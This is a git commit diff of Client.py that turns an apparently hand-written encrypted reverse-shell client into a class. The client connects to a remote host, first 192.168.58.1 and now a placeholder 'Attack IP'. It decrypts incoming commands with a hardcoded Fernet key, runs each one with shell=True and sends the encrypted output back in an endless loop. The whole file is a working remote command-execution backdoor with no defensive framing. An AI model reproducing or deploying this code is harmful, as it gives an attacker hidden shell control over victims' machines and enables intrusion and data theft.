4a540b48be545a29678dbf8d461b8b375c6cb908
TDisra <52383124+TDisra@users.noreply.github.com>
2023-01-14 01:16:40 +0200

    Update Client.py

--- Client.py
+++ Client.py
@@ -3,37 +3,42 @@ import subprocess
 from cryptography.fernet import Fernet
 
 key = b'6wifEyjwf89CwkUweVRcBMxU7ywgba3ayNRAm_0Gq9E='
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.58.1", 1212))
 
-def encrypt(msg,key):
-    ferObject = Fernet(key)
-    msgEncrypt = ferObject.encrypt(msg)
-    return msgEncrypt
+class Client(object):
+    def __init__(self, ip, port):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.connect((ip, port))
 
-def decrypt(msg,key):
-    ferObject = Fernet(key)
-    msgDecrypt = ferObject.decrypt(msg)
-    return msgDecrypt
+    def encrypt(self, msg,key):
+        ferObject = Fernet(key)
+        msgEncrypt = ferObject.encrypt(msg)
+        return msgEncrypt
 
+    def decrypt(self, msg,key):
+        ferObject = Fernet(key)
+        msgDecrypt = ferObject.decrypt(msg)
+        return msgDecrypt
 
-def cmd(command):
-    p = subprocess.Popen(command.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    return p.stdout.read().decode(errors='replace').strip()
+    def cmd(self, command):
+        p = subprocess.Popen(command.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        return p.stdout.read().decode(errors='replace').strip()
 
-def sendMsg(msg):
-    msg = encrypt(msg,key)
-    header = str(len(msg)).encode() #to send to the client the current length of the message
-    s.send(header)
-    s.send(msg) #sending the real message
+    def sendMsg(self, msg):
+        msg = self.encrypt(msg,key)
+        header = str(len(msg)).encode() #to send to the client the current length of the message
+        self.server.send(header)
+        self.server.send(msg) #sending the real message
 
-def readMsg():
-    header = s.recv(5)
-    msg = s.recv(int(header.decode()))
-    return decrypt(msg,key).decode()
+    def readMsg(self):
+        header = self.server.recv(5)
+        msg = self.server.recv(int(header.decode()))
+        return self.decrypt(msg,key).decode()
 
-while True:
-    command = readMsg()
-    out = cmd(command)
-    sendMsg(out.encode())
-    
+    def start(self):
+        while True:
+            command = self.readMsg()
+            out = self.cmd(command)
+            self.sendMsg(out.encode())
+
+c = Client("Attack IP", PORT)
+c.start()
